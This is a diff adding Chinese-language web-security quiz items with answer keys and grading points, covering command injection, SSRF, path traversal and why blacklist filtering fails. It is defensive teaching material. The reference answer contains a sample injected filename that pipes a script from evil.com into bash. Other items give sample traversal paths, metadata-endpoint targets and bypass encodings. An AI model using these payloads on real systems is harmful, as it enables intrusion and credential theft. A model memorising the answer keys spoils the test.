+      { "key": "C", "text": "路径穿越利用 ../ 跳出受限目录读取任意文件；防御应先规范化（resolve）路径，再校验结果仍位于允许的根目录之内" },
+      { "key": "D", "text": "这三类漏洞都可以靠在入口处用一个统一的黑名单关键字过滤彻底解决，后续无需任何处理" }
+    ],
+    "answer": { "keys": ["A", "B", "C"] },
+    "analysis": "A、B、C 正确。A 指出命令注入根因是 shell 元字符被解释执行，参数数组调用（如 child_process.execFile/spawn 而非 exec）不启动 shell 解释，元字符被当作普通参数，白名单进一步收敛。B 说明 SSRF 的目标是借服务端身份访问其可达而攻击者不可达的内网/元数据（如云平台 169.254.169.254 凭据端点），需协议白名单 + 目标地址校验（解析后比对内网网段，注意 DNS rebinding 等绕过）。C 给出路径穿越标准防法：先 resolve 规范化消除 ../ 与符号链接，再判断是否仍在根目录内，单纯字符串替换 ../ 不可靠。D 错误：黑名单永远可被编码、变形、新协议绕过，白名单与结构性校验才可靠。",
+    "gapCheck": [
+      "易漏点：SSRF 校验要在 DNS 解析后比对真实 IP，否则可能被 DNS rebinding 绕过",
+      "常见误区：用字符串替换 ../ 防穿越——编码、双写、绝对路径等都能绕过，必须 resolve 后判根目录",
+      "加分项：能讲 exec 与 execFile/spawn 的区别、云元数据防护（IMDSv2/禁用元数据访问）"
+    ],
+    "knowledgeLinks": {
+      "prereq": ["cs.seceq.web.injection"],
+      "related": ["cs.seceq.sec-eng.ratelimit-waf", "cs.net.dns.advanced"],
+      "followUps": [
+        "DNS rebinding 是怎么绕过 SSRF 的 IP 白名单的？如何防御？",
+        "文件下载功能如何同时防住路径穿越与任意文件读取？"
+      ]
+    },
+    "openBookAllowed": true,
+    "source": { "kind": "self-authored", "note": "命令注入/SSRF/路径穿越多选题" },
+    "tags": ["命令注入", "SSRF", "路径穿越", "白名单"]
+  },
+  {
+    "id": "Q-cs-seceq-web-0013",
+    "nodeId": "cs.seceq.web.injection",
+    "type": "judge",
+    "difficulty": 4,
+    "stem": "判断正误：对用户输入做关键字黑名单过滤（如拦截 select、union、../、127.0.0.1）可以作为纵深防御的一环，但不能作为唯一防线；因为攻击者可用大小写混合、编码、注释、等价写法、IP 的多种表示等方式绕过，真正可靠的是参数化、白名单与路径规范化这类结构性措施。",
+    "answer": { "judge": true },
+    "analysis": "正确。黑名单本质是『已知坏特征匹配』，而绕过手法持续演进：SQL 中大小写混用（SeLeCt）、内联注释（/**/）、等价函数、双重编码；路径中 URL 编码（%2e%2e%2f）、绝对路径、双写（....//）；SSRF 中 IP 的十进制/八进制/十六进制表示、指向内网的域名、短链跳转、DNS 重绑定。黑名单永远在被动追赶，且容易误伤正常数据。可靠做法是让恶意输入在结构上无法生效——SQL 参数化使数据不被当语法、命令用参数数组不经过 shell、路径 resolve 后判根目录、SSRF 用协议与地址白名单。黑名单/WAF 规则适合作为告警与兜底的纵深一层，而非唯一依赖。",
+    "gapCheck": [
+      "易漏点：黑名单可作纵深防御与监控信号，但不能承担主要防护职责",
+      "常见误区：以为拦住几个关键字就安全，忽略编码与等价表示的绕过",
+      "加分项：能具体举出 DNS rebinding、IP 进制表示、SQL 注释截断等绕过实例"
+    ],
+    "knowledgeLinks": {
+      "prereq": ["cs.seceq.web.injection"],
+      "related": ["cs.seceq.sec-eng.ratelimit-waf", "cs.seceq.sec-eng.owasp"],
+      "followUps": [
+        "WAF 规则被绕过的常见方式有哪些？为什么 WAF 不能替代代码层防御？",
+        "白名单校验在规则复杂（如富文本）时如何落地？"
+      ]
+    },
+    "openBookAllowed": true,
+    "source": { "kind": "self-authored", "note": "黑名单与结构性防御对比判断题" },
+    "tags": ["黑名单", "白名单", "注入", "WAF", "判断"]
+  },
+  {
+    "id": "Q-cs-seceq-web-0014",
+    "nodeId": "cs.seceq.web.injection",
+    "type": "blank",
+    "difficulty": 2,
+    "stem": "填空：防御 SQL 注入最根本的手段是使用 ______（预编译占位符，把语句结构与数据分离）；防御命令注入应避免经过 shell 解释、改用 ______ 方式传参并配合白名单；防御 SSRF 要对目标地址做白名单并禁止访问 ______ 与云元数据地址；防御路径穿越要先把路径 ______ 再校验其仍在允许的根目录内。",
+    "answer": {
+      "blanks": ["参数化查询", "参数数组", "内网地址段", "规范化"],
+      "synonyms": {
+        "参数化查询": ["预编译", "参数化", "Prepared Statement", "占位符"],
+        "参数数组": ["数组传参", "参数列表", "execFile", "spawn"],
+        "内网地址段": ["内网", "内网网段", "内网 IP", "私有地址段"],
+        "规范化": ["路径规范化", "resolve", "标准化", "归一化"]
+      }
+    },
+    "analysis": "四类注入的标准防御抓手：SQL 注入→参数化查询（Prepared Statement），占位符绑定的数据永不被解析为 SQL 语法；命令注入→参数数组调用（execFile/spawn）不启动 shell，元字符（;、|、&&）失去解释器；SSRF→协议与目标白名单，解析真实 IP 后拒绝 RFC1918 内网段、回环段与云元数据端点；路径穿越→先 path.resolve 规范化再做根目录包含校验。共同思想是『白名单 + 结构性隔离』优于黑名单关键字过滤。",
+    "gapCheck": [
+      "易漏点：SSRF 要在 DNS 解析后比对 IP，路径穿越要在 resolve 之后再判断包含关系",
+      "常见误区：把四类注入的防御混成一句『过滤特殊字符』，忽略各自的结构性措施",
+      "加分项：能补充最小权限账号、禁用危险函数、网络隔离等降低失陷影响面的手段"
+    ],
+    "knowledgeLinks": {
+      "prereq": ["cs.seceq.web.injection"],
+      "related": ["cs.seceq.sec-eng.ratelimit-waf", "cs.seceq.sec-eng.audit"],
+      "followUps": [
+        "哪些 SQL 位置不能用占位符，只能白名单？",
+        "容器/云环境下如何在网络层进一步限制 SSRF 的危害？"
+      ]
+    },
+    "openBookAllowed": false,
+    "source": { "kind": "self-authored", "note": "四类注入防御填空题" },
+    "tags": ["参数化查询", "命令注入", "SSRF", "路径穿越", "填空"]
+  },
+  {
+    "id": "Q-cs-seceq-web-0015",
+    "nodeId": "cs.seceq.web.injection",
+    "type": "short",
+    "difficulty": 5,
+    "stem": "战例分析：某平台有三个功能——①头像上传后服务端用 shell 命令调用 ImageMagick 处理，文件名直接拼进命令；②一个『网页预览』接口接收用户传入的 URL，服务端抓取后渲染缩略图；③文件下载接口用 `baseDir + '/' + 用户传入的 path` 直接读文件返回。请分别指出每个功能最可能存在的漏洞、攻击后果，并给出根治方案与统一的最小权限思路。",
+    "answer": {
+      "ref": "参考骨架：\n【功能①：命令注入】漏洞点：用户可控的文件名被拼进 shell 命令，攻击者可用分号、反引号、$()、&& 等元字符注入任意系统命令（如文件名取 `x.jpg; curl evil.com/sh | bash #`）。后果：以服务进程身份执行任意命令、读写服务器文件、植入后门、横向移动。根治：绝不拼 shell 字符串，改用不经过 shell 的参数数组 API（execFile/spawn）调用处理程序，文件名做白名单/重命名（服务端生成随机名），必要时在隔离沙箱/容器内执行，并及时升级组件（历史上图片处理组件本身也出过 RCE 漏洞）。\n【功能②：SSRF】漏洞点：服务端按用户给的 URL 发起请求，攻击者可传入内网地址（如 http://10.0.0.5:8080/admin）、回环、云元数据端点（169.254.169.254）或 file://、gopher:// 等协议。后果：借服务端身份探测/攻击内网系统、读取云主机临时凭据、访问仅内网可达的管理面。根治：协议白名单（仅 http/https）、域名白名单或业务允许清单、对解析出的真实 IP 校验并拒绝私有/回环/链路本地段（防 DNS rebinding 需在连接阶段再次校验或用受控解析器）、禁止重定向到内网、限制出口网络与超时、云上启用 IMDSv2 或限制元数据访问。\n【功能③：路径穿越（任意文件读取）】漏洞点：path 含 ../../etc/passwd 之类，拼接后跳出 baseDir。后果：读取配置、密钥、源码、系统文件等敏感数据，甚至配合写入功能 getshell。根治：用 path.resolve(baseDir, userPath) 规范化后，判断结果是否仍以 baseDir 为前缀（包含关系校验），否则拒绝；对 path 做白名单字符校验、拒绝绝对路径；下载对象尽量用间接 ID 映射而非真实路径。\n【统一最小权限思路】①账号/进程最小权限：业务数据库账号只给必要 DML、不给 DROP/FILE；服务进程非 root 运行，文件系统只开放必要目录。②网络最小化：服务出口默认拒绝、按需放通，使其即便被 SSRF/命令注入也难以触达内网敏感面。③输入白名单与结构性隔离优先于黑名单：参数化、参数数组、resolve 后校验。④隔离：文件处理、抓取等高危操作放沙箱/容器，限制系统调用与能力。⑤纵深检测：WAF 与审计日志记录异常输入与访问，便于发现绕过。核心是假设输入必然被攻破，用最小权限与隔离把单点漏洞的爆炸半径压到最小。"
+    },
+    "scoringPoints": [
+      { "point": "三个功能漏洞定性准确：命令注入、SSRF、路径穿越，并给出具体 payload 思路", "weight": 3 },
+      { "point": "每个漏洞的攻击后果与根治方案对应正确（参数数组/白名单、地址校验、resolve 根目录校验）", "weight": 4 },
+      { "point": "提到 DNS rebinding、元数据凭据、组件自身 RCE 等进阶点", "weight": 2 },
+      { "point": "统一最小权限与隔离思路完整（账号、进程、网络、沙箱、审计）", "weight": 3 }
+    ],
+    "analysis": "综合战例题，区分度高。常见失分：只识别一个漏洞、把 SSRF 和路径穿越混为一谈；防御停留在『过滤特殊字符』；命令注入不知道 shell 与非 shell 调用的区别；缺少最小权限/隔离这一横向收口思路。高分回答会按『漏洞定性→后果→结构性根治→权限收敛』逐功能拆解，并能点出云元数据、DNS rebinding 等实战细节。",
+    "gapCheck": [
+      "易漏点：文件名/URL/路径都是用户可控输入，任何进入命令、请求、文件 API 的拼接都要审视",
+      "常见误区：只在入口做关键字黑名单，忽略解析后校验（IP、规范化路径）与执行环境隔离",
+      "加分项：能讲沙箱/容器、非 root 运行、出口网络默认拒绝、IMDSv2 等运行时防护"
+    ],
+    "knowledgeLinks": {
+      "prereq": ["cs.seceq.web.injection"],
+      "related": ["cs.seceq.sec-eng.ratelimit-waf", "cs.seceq.sec-eng.audit", "cs.seceq.sec-eng.owasp"],
+      "followUps": [
+        "图片/文档处理组件为什么频频出 RCE？选型和部署上怎么降低风险？",
+        "如何在网关或 Service Mesh 层统一收敛 SSRF 的出口访问？"
+      ]
+    },
+    "openBookAllowed": true,
+    "source": { "kind": "self-authored", "note": "命令注入/SSRF/路径穿越综合战例简答题" },
+    "tags": ["命令注入", "SSRF", "路径穿越", "最小权限", "战例"]
+  }
+]
